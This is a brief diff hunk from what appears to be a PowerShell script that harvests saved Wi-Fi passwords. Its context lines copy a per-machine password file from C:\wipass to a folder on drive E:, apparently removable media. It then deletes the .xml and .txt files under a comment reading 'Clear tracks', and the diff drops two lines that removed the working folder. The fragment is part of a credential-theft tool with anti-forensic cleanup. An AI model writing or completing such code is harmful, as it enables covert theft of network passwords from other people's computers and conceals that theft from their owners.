@@ -19,5 +19,3 @@ copy-item "C:\wipass\$PC_NAME.txt" E:\Data\wifipass
 # Clear tracks
 rm *.xml
 rm *.txt
-cd ..
-rm wipass
